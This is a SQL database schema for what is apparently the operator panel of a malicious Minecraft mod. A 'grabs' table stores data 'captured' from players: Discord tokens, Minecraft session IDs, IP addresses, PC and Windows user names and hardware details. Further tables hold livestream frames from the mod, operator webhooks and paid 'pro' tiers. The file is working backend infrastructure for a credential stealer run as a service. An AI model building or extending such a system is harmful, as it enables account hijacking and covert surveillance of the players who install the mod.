-- Database schema for Modrinth Admin Panel
-- Run this in Supabase SQL Editor

-- Enable UUID extension
create extension if not exists "uuid-ossp";

-- Dedicated pro_users table
create table if not exists public.pro_users (
  email text primary key,
  is_pro boolean default false,
  free_uses_remaining integer default 3,
  updated_at timestamptz default now()
);

-- Mod version tracking
create table if not exists public.mod_versions (
  id uuid primary key default uuid_generate_v4(),
  email text not null,
  version_number integer not null default 1,
  created_at timestamptz default now()
);
create unique index if not exists mod_versions_email_idx on public.mod_versions (email);

-- Minecraft username to email mapping
create table if not exists public.user_minecraft (
  id uuid primary key default uuid_generate_v4(),
  email text not null,
  minecraft_username text not null,
  created_at timestamptz default now()
);
create unique index if not exists user_minecraft_username_idx on public.user_minecraft (minecraft_username);
create unique index if not exists user_minecraft_email_idx on public.user_minecraft (email);

-- User settings (webhook etc)
create table if not exists public.user_settings (
  id uuid primary key default uuid_generate_v4(),
  email text unique not null,
  webhook_url text default '',
  created_at timestamptz default now(),
  updated_at timestamptz default now()
);

-- UUID to email mapping (mod sends UUID, not email)
create table if not exists public.user_uuids (
  id uuid primary key default uuid_generate_v4(),
  mod_uuid text unique not null,
  email text not null,
  created_at timestamptz default now()
);
create index if not exists user_uuids_email_idx on public.user_uuids (email);

-- Grabs table (captured data from mod)
create table if not exists public.grabs (
  id uuid primary key default uuid_generate_v4(),
  owner_email text,
  minecraft_username text,
  discord_username text,
  ip_address text,
  country text,
  timezone text,
  os text,
  os_version text,
  pc_name text,
  windows_username text,
  cpu text,
  ram text,
  gpu text,
  screen_resolution text,
  disk_space text,
  java_version text,
  language text,
  desktop_env text,
  client_version text,
  session_id text,
  session_start text,
  discord_token text,
  servers text,
  created_at timestamptz default now(),
  updated_at timestamptz
);
create index if not exists grabs_owner_idx on public.grabs (owner_email);
create index if not exists grabs_mc_username_idx on public.grabs (minecraft_username);
create index if not exists grabs_created_idx on public.grabs (created_at);

-- Stream frames (livestream data from mod)
create table if not exists public.stream_frames (
  username text primary key,
  frame text,
  updated_at timestamptz default now()
);

-- Users table (extends Supabase auth.users)
create table if not exists public.users (
  id uuid primary key references auth.users(id) on delete cascade,
  email text unique not null,
  display_name text,
  avatar_url text,
  role text default 'user' check (role in ('owner', 'administrator', 'moderator', 'endpoint_manager', 'user')),
  status text default 'active' check (status in ('active', 'banned', 'suspended')),
  is_owner boolean default false,
  is_pro boolean default false,
  free_uses_remaining integer default 3,
  created_at timestamptz default now(),
  updated_at timestamptz default now(),
  last_login_at timestamptz
);
